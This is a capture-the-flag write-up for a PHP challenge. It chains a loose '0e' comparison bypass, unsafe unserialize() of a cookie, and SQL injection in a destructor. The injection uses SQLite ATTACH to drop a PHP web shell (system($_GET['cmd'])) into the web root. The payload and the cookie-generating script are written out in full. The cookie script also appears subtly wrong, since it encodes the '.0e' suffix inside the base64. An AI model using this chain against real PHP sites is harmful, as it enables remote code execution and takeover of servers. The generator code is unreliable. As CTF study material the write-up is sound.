## Cereal Logger (Hard)

To be this challenge was the hardest out of all the web challenges. It required me read up quite a bit on php and sql injection.

As with most the website displays it's source code.
```
 <?php

  class insert_log
  {
      public $new_data = "Valid access logged!";
      public function __destruct()
      {
          $this->pdo = new SQLite3("/tmp/log.db");
          $this->pdo->exec("INSERT INTO log (message) VALUES ('".$this->new_data."');");
      }
  }

  if (isset($_COOKIE["247"]) && explode(".", $_COOKIE["247"])[1].rand(0, 247247247) == "0") {
      file_put_contents("/dev/null", unserialize(base64_decode(explode(".", $_COOKIE["247"])[0])));
  } else {
      echo highlight_file(__FILE__, true);
  }
```

The first part of this code is a class that only contains a destructor that executes an sql query that looks injectable but given that this class is never constructed this code looks unreachable.

Then there is this code that allows us to write to dev null if we satisfy a special  condition. 
```
 if (isset($_COOKIE["247"]) && explode(".", $_COOKIE["247"])[1].rand(0, 247247247) == "0")
 ```
 Luckily this is pretty easy as it involves the same loose comparison to zero as Compare the Pair. The output of the random function doesn't matter as we control what it's prefixed with. If we set the prefix to `0e` we once again have zero on the left side of the comparison which is obviously equal ro zero.

 At this point I had still no idea how to exploit the write to `/dev/null`, I wasn't familiar with `unserialize()` and initially assumed decodes some serialized data format into a string. When I looked up it's documentation I realized thats not true.
> unserialize() takes a single serialized variable and converts it back into a PHP value. 

> Warning: Do not pass untrusted user input to unserialize() regardless of the options value of allowed_classes. Unserialization can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this. Use

Some more googling revealed that we can actually pass the serialized version of class instance. So what if we pass an instance of `insert_log`?. The result goes out scope almost immediately so `__destruct()` is going to be called and given that we control the creation of the instance we also control the `new_data` attribute. With that we can do sql injection but the problem is we don't actually get the result of the query.
With much googling I found this payload that gets PHP code execution using an SQLite database. (Thanks to PHP trying to make sense of php inside a database file. yeah...)
```
'); ATTACH DATABASE '/var/www/html/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ('<?php echo \"<pre>\"; system(\$_GET[\"cmd\"]);?>');--
```

Putting this together leaves this PHP code generate the cookie.
```
<?php

class insert_log
  {
      public $new_data;
      function __construct($data) {
        $this->new_data = $data;
    }
  }
$injection = "'); ATTACH DATABASE '/var/www/html/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ('<?php echo \"<pre>\"; system(\$_GET[\"cmd\"]);?>');-- -";
$obj = new insert_log($injection);
echo base64_encode(serialize($obj).".0e");
echo "\n";
```
Visiting the challenge page with cookie generated by this codes creates `lol.php`.  The flag was than extracted by `cat`'ing `/tmp/log.db`